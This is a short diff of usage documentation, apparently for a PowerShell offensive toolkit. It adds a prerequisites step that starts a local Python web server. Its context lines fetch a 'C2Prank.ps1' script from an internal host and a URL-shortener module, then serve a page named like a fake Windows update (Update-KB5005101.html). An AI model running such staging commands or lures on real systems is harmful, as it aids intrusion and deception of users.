@@ -64,7 +64,19 @@ cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-ShortUrl.ps1" -OutFile "Invoke-ShortUrl.ps1"
 ```
 
+<br />
+
+**prerequesites checks:**
 ```powershell
+#Make sure python (http.server) its available [optional]
+python -m http.server 8089 --bind 127.0.0.1
+```
+
+```powershell
+#Get module full help
+Get-Help .\Invoke-ShortUrl.ps1 -Full
+
+
 #URI: http://127.0.0.1:8080/Update-KB5005101.html
 .\Invoke-ShortUrl.ps1 -ServerPort '127.0.0.1:8080'
 
